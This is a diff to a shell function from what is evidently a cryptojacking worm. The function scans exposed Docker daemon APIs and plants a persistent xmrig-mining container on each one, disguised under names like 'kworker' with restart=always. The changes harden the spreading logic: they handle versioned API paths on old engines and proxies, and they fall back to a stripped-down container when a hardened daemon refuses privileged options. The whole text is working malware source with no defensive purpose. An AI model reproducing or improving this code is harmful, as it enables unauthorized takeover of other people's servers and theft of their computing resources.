@@ -86,63 +86,118 @@ dock_one() {
     opts=${ep#*|}
 
     ver=$(curl -fsS $opts --max-time 4 "$base/version" 2>/dev/null) || ver=""
-    vs=$(printf '%s' "$ver" | grep -o '"Version":"[^"]*"' | head -1 | cut -d'"' -f4)
+    # old engines (18.06-era) emit '"Version": "x"' WITH a space; a strict grep
+    # silently returned an empty version and, worse, an empty ApiVersion - which
+    # sent every later call down the unversioned path they do not route.
+    vs=$(printf '%s' "$ver" | grep -o '"Version": *"[^"]*"' | head -1 | cut -d'"' -f4)
+    # Speak /v<ApiVersion>/... like a real client. Not cosmetic: old engines and
+    # api proxies answer "page not found" to *unversioned dynamic* paths such as
+    # /containers/<id>/json or /containers/<id>/start, while the static
+    # /containers/json and /version keep working - which is precisely how
+    # "created but start failed" was born (create is static, start is not).
+    vapi=$(printf '%s' "$ver" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
+    b="$base"
+    [ -n "$vapi" ] && b="$base/v$vapi"
     printf '%s\n' "$ip" >> "$SEEN"
-    echo "dock: daemon $ip  $base  docker=${vs:-?}"
+    echo "dock: daemon $ip  $base  docker=${vs:-?} api=${vapi:-?}"
 
     # if this daemon is the very box we are running on, the ssh payload already
     # mines here - a second xmrig would just buy a second randomx dataset. Only
     # an existing container of ours is worth touching (handled above).
     if [ "$SKIPSELF" = yes ]; then
         me=$(hostname 2>/dev/null) || me=""
-        nm=$(curl -fsS $opts --max-time 4 "$base/info" 2>/dev/null \
-             | grep -o '"Name":"[^"]*"' | head -1 | cut -d'"' -f4)
+        nm=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null \
+             | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
         if [ -n "$me" ] && [ "$nm" = "$me" ]; then
             echo "dock: $ip is this host (payload mines here already)"
             return 0
         fi
     fi
 
-    # pick a free boring name; if one already runs our image, reuse it
+    # ONE list call tells us what is already here. Name-based /containers/<n>/json
+    # 404s on a chunk of the population (old engines, api proxies - "page not
+    # found"), so a name always *looked* free and the container was created blind;
+    # the start by name then 404s too. So: read the list, and take the id from
+    # create's response instead of spelling it by name.
+    lst=$(curl -sS $opts --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
+    if [ -z "$lst" ] && [ "$b" != "$base" ]; then
+        # this front routes only the bare spelling - pin that for every call that
+        # follows rather than keep guessing
+        lst=$(curl -sS $opts --max-time 6 "$base/containers/json?all=1" 2>/dev/null) || lst=""
+        [ -n "$lst" ] && b="$base"
+    fi
+    # docker 18.06 writes '"Id": "x"' with a space; normalise once so the awk
+    # below (and the name-taken test) can trust a single spelling.
+    lst=$(printf '%s' "$lst" | sed 's/": /":/g')
+    have=$(printf '%s' "$lst" | awk -v img="\"Image\":\"$IMAGE\"" '
+        { n = split($0, a, "\"Id\":\"")
+          for (i = 2; i <= n; i++)
+              if (index(a[i], img) > 0) { split(a[i], b, "\""); print b[1]; exit } }')
+    if [ -n "$have" ]; then
+        up=$(printf '%s' "$lst" | awk -v img="\"Image\":\"$IMAGE\"" '
+            { n = split($0, a, "\"Id\":\"")
+              for (i = 2; i <= n; i++)
+                  if (index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
+        if [ "$up" = up ]; then
+            echo "dock: $ip already runs ours ($have)"
+        else
+            curl -fsS $opts --max-time 15 -X POST "$b/containers/$have/start" >/dev/null 2>&1 || :
+            echo "dock: $ip started our existing container ($have)"
+        fi
+        printf '%s\t%s\n' "$ip" "existing" >> "$OWNFILE"
+        return 0
+    fi
+
+    # pick a free boring name; "taken" means the list mentions it
     name=""
     for n in kworker kworker1 kworker2 kworker3; do
-        if insp=$(curl -fsS $opts --max-time 5 "$base/containers/$n/json" 2>/dev/null); then
-            case "$insp" in
-                *"\"Image\":\"$IMAGE\""*)
-                    name=$n
-                    case "$insp" in
-                        *'"Running":true'*)
-                            echo "dock: $ip already runs ours ($name)" ;;
-                        *)
-                            curl -fsS $opts --max-time 10 -X POST \
-                                 "$base/containers/$name/start" >/dev/null 2>&1 || :
-                            echo "dock: $ip restarted our container ($name)" ;;
-                    esac
-                    printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
-                    return 0 ;;
-                *) continue ;;   # someone else's container holds that name
-            esac
-        fi
+        case "$lst" in
+            *"\"/$n\""*) continue ;;   # someone else's container holds that name
+        esac
         name=$n
         break
     done
     [ -n "$name" ] || { echo "dock: $ip all names taken"; return 0; }
 
     # pull only if the image is not already there (their bandwidth)
-    if ! curl -fsS $opts --max-time 6 "$base/images/$IMAGE/json" >/dev/null 2>&1; then
+    if ! curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then
         echo "dock: $ip pulling $IMAGE"
-        curl -fsS $opts --max-time 300 -X POST \
-             "$base/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
+        curl -sS $opts --max-time 300 -X POST \
+             "$b/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
     fi
 
-    if curl -fsS $opts --max-time 30 -X POST "$base/containers/create?name=$name" \
-            -H "Content-Type: application/json" -d "$BODY" >/dev/null 2>&1; then
-        if curl -fsS $opts --max-time 20 -X POST \
-                "$base/containers/$name/start" >/dev/null 2>&1; then
+    # NOTE the -f on the create/start checks: without it a 404 body
+    # ({"message":"page not found"}) still exits 0 and a failed start is
+    # recorded as a deploy.
+    if r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
+                -H "Content-Type: application/json" -d "$BODY" 2>/dev/null); then
+        id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
+        cid=${id:-$name}
+        if curl -fsS $opts --max-time 25 -X POST \
+                "$b/containers/$cid/start" >/dev/null 2>&1; then
             printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
             echo "dock: DEPLOYED $name -> $ip (restart=always)"
         else
-            echo "dock: created but start failed on $ip"
+            # a second attempt as boring as possible: SYS_ADMIN, host ipc and
+            # cpu shares are all things a hardened daemon can refuse at start.
+            echo "dock: $ip refused $name, retrying plain"
+            curl -sS $opts --max-time 20 -X DELETE \
+                 "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
+            body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS]"
+            body_min="$body_min,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
+            if r2=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
+                          -H "Content-Type: application/json" -d "$body_min" 2>/dev/null); then
+                id2=$(printf '%s' "$r2" | grep -oE '[0-9a-f]{64}' | head -1)
+                if curl -fsS $opts --max-time 25 -X POST \
+                        "$b/containers/${id2:-$name}/start" >/dev/null 2>&1; then
+                    printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
+                    echo "dock: DEPLOYED $name -> $ip (plain, restart=always)"
+                else
+                    echo "dock: start failed even plain on $ip"
+                fi
+            else
+                echo "dock: recreate failed on $ip"
+            fi
         fi
     else
         echo "dock: create failed on $ip"
